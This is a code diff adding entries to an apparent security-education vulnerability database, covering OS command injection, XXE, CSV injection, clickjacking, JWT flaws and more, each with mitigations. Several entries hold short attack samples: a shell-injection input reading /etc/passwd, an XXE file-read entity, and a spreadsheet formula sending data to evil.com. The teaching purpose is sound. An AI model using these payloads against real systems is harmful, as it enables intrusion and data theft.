@@ -90,6 +90,150 @@ const vulnDatabase: Vulnerability[] = [
     mitigation: ["Encrypt all data in transit using TLS 1.2+", "Hash passwords with Argon2, bcrypt, or scrypt", "Encrypt sensitive data at rest using AES-256", "Classify data and apply appropriate protection levels", "Never log sensitive data (PII, credentials, tokens)", "Use proper key management (HSM, vault, KMS)", "Implement HSTS headers to force HTTPS"],
     references: ["OWASP: A02:2021 Cryptographic Failures", "CWE-312: Cleartext Storage", "PCI DSS v4.0"]
   },
+  {
+    id: "CWE-78", name: "OS Command Injection", aliases: ["command injection", "shell injection", "rce"], severity: "Critical", category: "Injection",
+    description: "OS Command Injection allows attackers to execute arbitrary operating system commands on the server by injecting malicious input into system shell calls.",
+    impact: "Full server compromise, data exfiltration, lateral movement across the network, installation of backdoors and malware.",
+    howItWorks: "When an application passes user-supplied input to system shell commands (exec, system, popen) without sanitization:\n\nVulnerable code:\nos.system('ping ' + user_input)\n\nAttack input: 127.0.0.1; cat /etc/passwd\n\nThe semicolon terminates the ping command and executes cat, exposing system files.",
+    realWorldExample: "In 2021, the Log4Shell vulnerability (CVE-2021-44228) in Apache Log4j allowed remote code execution via JNDI lookups, affecting millions of applications worldwide.",
+    mitigation: ["Never pass user input directly to OS commands", "Use language-native APIs instead of shell commands (e.g., subprocess with array args in Python)", "Implement strict input validation with allowlists", "Run applications with least-privilege OS accounts", "Use containers and sandboxing to limit blast radius", "Deploy runtime application self-protection (RASP)"],
+    references: ["OWASP: A03:2021 Injection", "CWE-78: OS Command Injection", "MITRE ATT&CK: T1059"]
+  },
+  {
+    id: "CWE-611", name: "XML External Entity (XXE)", aliases: ["xxe", "xml injection", "xml external entity"], severity: "High", category: "Injection",
+    description: "XXE attacks exploit XML parsers that process external entity references, allowing attackers to read local files, perform SSRF, or cause denial of service.",
+    impact: "Reading sensitive server files, SSRF to internal services, denial of service via recursive entity expansion (Billion Laughs), and potential remote code execution.",
+    howItWorks: "Attackers submit crafted XML with external entity declarations:\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n\nThe XML parser resolves the entity, reading the file contents into the response.",
+    realWorldExample: "In 2018, an XXE vulnerability was discovered in the .NET framework's handling of XSLT transformations, affecting numerous Microsoft applications and services.",
+    mitigation: ["Disable DTD processing and external entities in XML parsers", "Use less complex data formats like JSON where possible", "Patch and upgrade XML processors and libraries", "Implement server-side input validation and sanitization", "Use SAST tools to detect XXE patterns in code"],
+    references: ["OWASP: A05:2021 Security Misconfiguration", "CWE-611: XXE", "NIST NVD"]
+  },
+  {
+    id: "CWE-434", name: "Unrestricted File Upload", aliases: ["file upload", "malicious upload", "webshell upload"], severity: "Critical", category: "Input Validation",
+    description: "When an application allows users to upload files without proper validation, attackers can upload malicious files such as web shells, malware, or scripts.",
+    impact: "Remote code execution via web shell, server compromise, malware distribution, storage exhaustion, and defacement.",
+    howItWorks: "Attack steps:\n\n1. Attacker uploads a file with a server-executable extension (e.g., .php, .jsp, .aspx)\n2. The server stores it in a web-accessible directory\n3. Attacker navigates to the uploaded file URL\n4. The server executes the malicious code\n\nBypass techniques include: double extensions (file.php.jpg), null bytes (file.php%00.jpg), MIME type spoofing, and content-type manipulation.",
+    realWorldExample: "In 2020, a file upload vulnerability in the WordPress File Manager plugin (CVE-2020-25213) was exploited to upload web shells, affecting 700,000+ websites.",
+    mitigation: ["Validate file type using magic bytes, not just extension or MIME type", "Store uploaded files outside the web root", "Rename uploaded files with random generated names", "Set strict file size limits", "Scan uploads with antivirus/malware detection", "Serve uploaded files through a separate domain or CDN", "Remove execute permissions from upload directories"],
+    references: ["OWASP: A04:2021 Insecure Design", "CWE-434: Unrestricted Upload"]
+  },
+  {
+    id: "CWE-269", name: "Privilege Escalation", aliases: ["privesc", "privilege escalation", "idor", "broken access control"], severity: "Critical", category: "Access Control",
+    description: "Privilege escalation occurs when a user gains access to resources or capabilities beyond their authorized permissions, either vertically (gaining higher privileges) or horizontally (accessing other users' data).",
+    impact: "Unauthorized access to admin functionality, other users' data, sensitive operations, and complete system takeover.",
+    howItWorks: "Vertical escalation: A regular user accesses admin endpoints:\nGET /api/admin/users (no role check on server)\n\nHorizontal escalation (IDOR): A user accesses another user's data by modifying identifiers:\nGET /api/orders/12345 → GET /api/orders/12346\n\nThe server fails to verify the requesting user owns the resource.",
+    realWorldExample: "In 2019, a privilege escalation bug in Facebook allowed attackers to gain admin access to Facebook Pages they didn't own, affecting millions of pages.",
+    mitigation: ["Implement server-side authorization checks on every request", "Use indirect object references instead of direct database IDs", "Apply deny-by-default access control policies", "Enforce role-based access control (RBAC) or attribute-based access control (ABAC)", "Log and monitor privilege escalation attempts", "Regularly audit access control rules and permissions"],
+    references: ["OWASP: A01:2021 Broken Access Control", "CWE-269: Improper Privilege Management", "CWE-639: IDOR"]
+  },
+  {
+    id: "CWE-798", name: "Hardcoded Credentials", aliases: ["hardcoded password", "hardcoded secret", "embedded credentials", "secret in code"], severity: "High", category: "Authentication",
+    description: "Hardcoded credentials occur when passwords, API keys, tokens, or cryptographic keys are embedded directly in source code, configuration files, or compiled binaries.",
+    impact: "Unauthorized access to systems and services, credential exposure through source code repositories, inability to rotate credentials without code changes.",
+    howItWorks: "Developers embed secrets directly in code for convenience:\n\nconst API_KEY = 'sk-live-abc123xyz789';\nconst DB_PASSWORD = 'admin123';\n\nThese secrets end up in version control (Git), compiled artifacts, container images, and client-side bundles, where they can be easily discovered.",
+    realWorldExample: "In 2022, Toyota disclosed that a contractor had accidentally published a credential to a public GitHub repository, exposing customer data for nearly 5 years.",
+    mitigation: ["Use environment variables or secret management systems (Vault, AWS Secrets Manager)", "Implement pre-commit hooks to scan for secrets (git-secrets, trufflehog)", "Rotate all credentials that may have been exposed", "Use .gitignore to exclude configuration files with secrets", "Conduct regular repository scans for leaked credentials", "Use short-lived tokens and service accounts instead of static credentials"],
+    references: ["OWASP: A07:2021 Authentication Failures", "CWE-798: Use of Hardcoded Credentials"]
+  },
+  {
+    id: "CWE-327", name: "Weak Cryptography", aliases: ["weak encryption", "broken crypto", "md5", "sha1", "des", "rc4"], severity: "High", category: "Cryptography",
+    description: "Using outdated, weak, or improperly implemented cryptographic algorithms that can be broken or bypassed by attackers.",
+    impact: "Data decryption, forged signatures, authentication bypass, and compliance violations.",
+    howItWorks: "Common weaknesses:\n\n1. Weak hashing: MD5 and SHA1 are vulnerable to collision attacks\n2. Weak encryption: DES, 3DES, RC4 have known vulnerabilities\n3. ECB mode: Reveals patterns in encrypted data\n4. No salt: Makes rainbow table attacks feasible\n5. Short keys: RSA < 2048 bits, AES < 128 bits\n\nExample: MD5('password') always produces the same hash, making it trivially reversible with lookup tables.",
+    realWorldExample: "In 2017, Google demonstrated the first practical SHA-1 collision (SHAttered), proving SHA-1 is unsuitable for security purposes. Many certificate authorities had already been using SHA-1 for TLS certificates.",
+    mitigation: ["Use AES-256-GCM for symmetric encryption", "Use RSA-2048+ or Ed25519 for asymmetric operations", "Use SHA-256 or SHA-3 for hashing", "Use Argon2id for password hashing", "Always use authenticated encryption modes (GCM, CCM)", "Implement proper key rotation and management", "Follow NIST cryptographic standards"],
+    references: ["OWASP: A02:2021 Cryptographic Failures", "CWE-327: Broken Crypto Algorithm", "NIST SP 800-131A"]
+  },
+  {
+    id: "CWE-1021", name: "Clickjacking", aliases: ["clickjacking", "ui redressing", "frame injection"], severity: "Medium", category: "UI Security",
+    description: "Clickjacking tricks users into clicking on hidden elements by overlaying transparent frames on legitimate-looking pages, causing unintended actions.",
+    impact: "Unauthorized actions (liking pages, enabling cameras, making purchases), credential theft, and malware installation.",
+    howItWorks: "The attacker creates a page with an invisible iframe loading the target site:\n\n<iframe src=\"https://target.com/delete-account\"\n  style=\"opacity:0; position:absolute; top:0; left:0;\"\n  width=\"100%\" height=\"100%\">\n</iframe>\n<button style=\"position:relative;\">Click to win a prize!</button>\n\nWhen the victim clicks the visible button, they actually click the hidden iframe's delete button.",
+    realWorldExample: "In 2015, a clickjacking attack on Flash Player's settings manager allowed attackers to enable users' webcams and microphones without their knowledge.",
+    mitigation: ["Set X-Frame-Options header to DENY or SAMEORIGIN", "Use Content-Security-Policy frame-ancestors directive", "Implement frame-busting JavaScript as a fallback", "Require user confirmation for sensitive actions (not just a single click)", "Use SameSite cookies to prevent cross-site embedding"],
+    references: ["OWASP: Clickjacking Defense Cheat Sheet", "CWE-1021: Improper Restriction of Rendered UI Layers"]
+  },
+  {
+    id: "CWE-776", name: "XML Bomb (Billion Laughs)", aliases: ["xml bomb", "billion laughs", "entity expansion", "dos xml"], severity: "Medium", category: "Denial of Service",
+    description: "An XML bomb is a denial-of-service attack that uses recursive or exponentially expanding XML entity definitions to consume all available memory and CPU.",
+    impact: "Server crash, denial of service, resource exhaustion, and potential cascading failures across dependent services.",
+    howItWorks: "The attacker submits XML with nested entity definitions that expand exponentially:\n\n<!DOCTYPE bomb [\n  <!ENTITY a \"lol\">\n  <!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">\n  <!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">\n  ...\n]>\n<root>&i;</root>\n\nEach level multiplies by 10, so 9 levels = 10^9 (1 billion) copies of 'lol', consuming ~3 GB of memory.",
+    realWorldExample: "XML bombs have affected numerous XML-processing services including SOAP web services, document processing pipelines, and CI/CD build systems that parse XML configurations.",
+    mitigation: ["Disable DTD processing entirely when not needed", "Set entity expansion limits in XML parsers", "Implement memory and CPU limits for XML processing", "Use streaming XML parsers (SAX) instead of DOM parsers for large inputs", "Monitor resource usage and set processing timeouts"],
+    references: ["CWE-776: Improper Restriction of Recursive Entity References", "OWASP XML Security Cheat Sheet"]
+  },
+  {
+    id: "CWE-916", name: "Insufficient Password Hashing", aliases: ["weak hashing", "unsalted hash", "password storage"], severity: "High", category: "Cryptography",
+    description: "Storing passwords using weak, fast, or unsalted hashing algorithms that can be easily reversed through brute force, rainbow tables, or dictionary attacks.",
+    impact: "Mass password compromise from database breaches, credential reuse attacks across services, and regulatory non-compliance.",
+    howItWorks: "Weak approaches:\n\n1. Plaintext: password stored as-is\n2. Simple hash: SHA256(password) — fast to brute force (billions/sec on GPU)\n3. Unsalted hash: identical passwords produce identical hashes\n4. Single iteration: one round of hashing is too fast\n\nModern GPUs can compute 10+ billion MD5 or 3+ billion SHA-256 hashes per second, cracking most passwords in minutes.",
+    realWorldExample: "LinkedIn's 2012 breach exposed 6.5 million passwords stored as unsalted SHA-1 hashes. Within days, over 90% were cracked by security researchers.",
+    mitigation: ["Use Argon2id (winner of Password Hashing Competition)", "Alternatively use bcrypt (cost factor ≥ 12) or scrypt", "Always use unique per-password salts (built into bcrypt/Argon2)", "Implement pepper (server-side secret added before hashing)", "Set work factors to take ~250ms per hash on your hardware", "Re-hash passwords with stronger algorithms during login"],
+    references: ["OWASP: Password Storage Cheat Sheet", "CWE-916: Use of Password Hash With Insufficient Computational Effort"]
+  },
+  {
+    id: "CWE-1236", name: "CSV Injection", aliases: ["csv injection", "formula injection", "spreadsheet injection"], severity: "Medium", category: "Injection",
+    description: "CSV Injection occurs when user-controlled data is included in CSV exports without sanitization, allowing injection of spreadsheet formulas that execute when opened.",
+    impact: "Data exfiltration via external requests, local file reading, and potential remote code execution through DDE (Dynamic Data Exchange) in Excel.",
+    howItWorks: "An attacker enters formula-like data into application fields:\n\nName field: =HYPERLINK(\"https://evil.com/steal?d=\"&A1, \"Click here\")\nOr: =CMD|'/C calc'!A0  (DDE attack)\n\nWhen an admin exports data to CSV and opens it in Excel, the formulas execute automatically, potentially sending data to the attacker or running system commands.",
+    realWorldExample: "Multiple bug bounty reports have documented CSV injection in platforms like HackerOne, Google Sheets integrations, and CRM systems that export user-provided data.",
+    mitigation: ["Prefix cell values starting with =, +, -, @, \\t, \\r with a single quote (')", "Validate and sanitize all user inputs before including in exports", "Use proper CSV libraries that handle escaping", "Warn users about opening CSV files from untrusted sources", "Consider using safer export formats like JSON or XLSX with protection"],
+    references: ["OWASP: CSV Injection", "CWE-1236: Improper Neutralization of Formula Elements"]
+  },
+  {
+    id: "CWE-942", name: "CORS Misconfiguration", aliases: ["cors", "cors misconfiguration", "cross origin", "access control allow origin"], severity: "High", category: "Access Control",
+    description: "Misconfigured Cross-Origin Resource Sharing (CORS) policies allow unauthorized domains to make authenticated requests to your API, enabling data theft.",
+    impact: "Unauthorized data access, account takeover, sensitive data theft, and bypassing same-origin policy protections.",
+    howItWorks: "Dangerous CORS configurations:\n\n1. Wildcard with credentials:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\n2. Reflecting the Origin header:\nOrigin: https://evil.com → Access-Control-Allow-Origin: https://evil.com\n\n3. Null origin allowance:\nAccess-Control-Allow-Origin: null\n\nAn attacker's page can then make authenticated API requests and read responses.",
+    realWorldExample: "In 2017, a CORS misconfiguration in a major cryptocurrency exchange allowed attackers to steal API keys and funds by tricking users into visiting a malicious page.",
+    mitigation: ["Never use wildcard (*) with Access-Control-Allow-Credentials: true", "Maintain a strict allowlist of permitted origins", "Never reflect the Origin header without validation", "Avoid allowing the null origin", "Limit Access-Control-Allow-Methods to required HTTP methods", "Set appropriate Access-Control-Max-Age values"],
+    references: ["OWASP: A05:2021 Security Misconfiguration", "CWE-942: Overly Permissive CORS Policy", "MDN: CORS"]
+  },
+  {
+    id: "CWE-347", name: "JWT Vulnerabilities", aliases: ["jwt", "json web token", "jwt attack", "token forgery"], severity: "High", category: "Authentication",
+    description: "Improper implementation of JSON Web Tokens can allow attackers to forge tokens, bypass authentication, or escalate privileges.",
+    impact: "Authentication bypass, privilege escalation, account takeover, and unauthorized access to protected resources.",
+    howItWorks: "Common JWT attacks:\n\n1. Algorithm None: Setting alg to 'none' skips signature verification\n{\"alg\":\"none\"}.{\"sub\":\"admin\"}\n\n2. Algorithm confusion: Switching RS256 to HS256 and signing with the public key\n\n3. Weak secrets: Brute-forcing HMAC secrets\n\n4. Missing expiration: Tokens without exp claim never expire\n\n5. Unvalidated claims: Trusting role/admin claims without server-side checks",
+    realWorldExample: "In 2020, a JWT vulnerability in Auth0 allowed attackers to bypass authentication by exploiting the algorithm confusion technique, affecting applications using the library.",
+    mitigation: ["Always validate the algorithm server-side (never accept 'none')", "Use strong secrets for HMAC (256+ bits of entropy)", "Always set and validate exp (expiration) claims", "Use asymmetric algorithms (RS256, ES256) for distributed systems", "Validate all claims server-side, never trust client-provided roles", "Implement token revocation (blacklist or short-lived + refresh tokens)", "Use established JWT libraries, never implement your own"],
+    references: ["OWASP: JSON Web Token Cheat Sheet", "CWE-347: Improper Verification of Cryptographic Signature", "RFC 7519"]
+  },
+  {
+    id: "CWE-400", name: "Rate Limiting / DoS", aliases: ["rate limiting", "dos", "ddos", "denial of service", "brute force"], severity: "Medium", category: "Availability",
+    description: "Lack of rate limiting allows attackers to overwhelm application resources through excessive requests, or brute-force credentials and tokens.",
+    impact: "Service unavailability, resource exhaustion, successful brute-force attacks, financial damage from compute costs, and degraded experience for legitimate users.",
+    howItWorks: "Without rate limiting:\n\n1. Brute force: Trying thousands of passwords per second\n2. API abuse: Making millions of API calls to exhaust quotas\n3. Application DoS: Targeting expensive operations (search, reports)\n4. Account enumeration: Testing email addresses at login/registration\n\nEven without a botnet, a single machine can send thousands of HTTP requests per second.",
+    realWorldExample: "In 2016, a massive DDoS attack using the Mirai botnet targeted DNS provider Dyn, taking down major websites including Twitter, Netflix, and Reddit for hours.",
+    mitigation: ["Implement rate limiting per IP, user, and API key", "Use exponential backoff for authentication failures", "Deploy a WAF with DDoS protection (Cloudflare, AWS Shield)", "Implement CAPTCHA for sensitive endpoints after threshold", "Use connection timeouts and request size limits", "Monitor and alert on unusual traffic patterns", "Implement circuit breakers for downstream service protection"],
+    references: ["OWASP: Denial of Service Cheat Sheet", "CWE-400: Uncontrolled Resource Consumption"]
+  },
+  {
+    id: "CWE-1104", name: "Supply Chain Attack", aliases: ["supply chain", "dependency confusion", "typosquatting", "compromised package"], severity: "Critical", category: "Supply Chain",
+    description: "Supply chain attacks compromise software by targeting less-secure elements in the development pipeline — dependencies, build tools, CI/CD systems, or update mechanisms.",
+    impact: "Backdoor installation, data theft, ransomware deployment, cryptocurrency mining, and compromise of all downstream users.",
+    howItWorks: "Attack vectors:\n\n1. Dependency confusion: Publishing malicious packages with internal package names to public registries\n2. Typosquatting: Creating packages with names similar to popular ones (lodash → lodahs)\n3. Compromised maintainers: Taking over abandoned packages or bribing maintainers\n4. Build pipeline attacks: Injecting malicious code during CI/CD\n5. Malicious updates: Compromising a legitimate package's update mechanism",
+    realWorldExample: "The 2020 SolarWinds attack compromised the Orion build system, distributing backdoored updates to 18,000+ organizations including US government agencies and Fortune 500 companies.",
+    mitigation: ["Pin dependency versions and use lock files (package-lock.json, yarn.lock)", "Enable npm audit / Snyk / Dependabot for vulnerability scanning", "Use private registries with scoped packages for internal code", "Verify package integrity with checksums and signatures", "Review dependency changes in pull requests", "Implement Software Bill of Materials (SBOM)", "Use tools like Socket.dev to detect suspicious package behavior"],
+    references: ["OWASP: A06:2021 Vulnerable and Outdated Components", "CWE-1104: Use of Unmaintained Third-Party Components"]
+  },
+  {
+    id: "CWE-532", name: "Information Leakage via Logs", aliases: ["log injection", "sensitive data in logs", "log leakage", "verbose errors"], severity: "Medium", category: "Information Disclosure",
+    description: "Applications that log sensitive information (passwords, tokens, PII, credit cards) or expose verbose error messages can leak data to attackers who gain access to logs.",
+    impact: "Credential exposure, PII leakage, compliance violations (GDPR, HIPAA), and information useful for further attacks.",
+    howItWorks: "Common scenarios:\n\n1. Logging authentication requests with passwords:\nlog.info('Login attempt: user=' + email + ' pass=' + password)\n\n2. Stack traces in production responses:\n{\"error\": \"NullPointerException at UserService.java:142\", \"stack\": \"...\"}\n\n3. Logging API keys and tokens in request headers\n\n4. Verbose database error messages revealing schema details",
+    realWorldExample: "In 2018, Twitter disclosed that a bug caused passwords to be written to an internal log in plaintext before hashing, affecting 330 million users who were advised to change their passwords.",
+    mitigation: ["Never log passwords, tokens, API keys, or credit card numbers", "Implement structured logging with automatic PII redaction", "Use generic error messages in production (hide stack traces)", "Classify log levels appropriately (DEBUG vs PRODUCTION)", "Encrypt log storage and restrict access with RBAC", "Implement log rotation and retention policies", "Audit logging configurations regularly"],
+    references: ["OWASP: A09:2021 Security Logging and Monitoring Failures", "CWE-532: Information Exposure Through Log Files"]
+  },
+  {
+    id: "CWE-601", name: "Open Redirect", aliases: ["open redirect", "url redirect", "redirect vulnerability"], severity: "Medium", category: "Input Validation",
+    description: "Open redirect vulnerabilities allow attackers to redirect users from a trusted site to a malicious site by manipulating URL parameters.",
+    impact: "Phishing attacks using trusted domain reputation, credential theft, OAuth token theft, and malware distribution.",
+    howItWorks: "Vulnerable URL pattern:\nhttps://trusted-bank.com/redirect?url=https://evil-phishing.com/login\n\nThe trusted domain appears in the URL, making the phishing page appear legitimate. This is especially dangerous in OAuth flows:\n\nhttps://auth.example.com/authorize?\n  client_id=app&\n  redirect_uri=https://evil.com/callback\n\nThe attacker receives the OAuth authorization code or token.",
+    realWorldExample: "Open redirect vulnerabilities have been found in Google, Facebook, and major financial institutions. They are commonly chained with OAuth flows to steal authentication tokens.",
+    mitigation: ["Use an allowlist of permitted redirect URLs", "Avoid passing redirect URLs as parameters", "Use indirect references (map IDs to URLs server-side)", "Validate that redirect URLs belong to your domain", "Display a warning page before redirecting to external URLs", "For OAuth, strictly validate redirect_uri against registered URIs"],
+    references: ["OWASP: Unvalidated Redirects and Forwards", "CWE-601: URL Redirection to Untrusted Site"]
+  },
 ];
 
 const severityColor: Record<string, string> = {
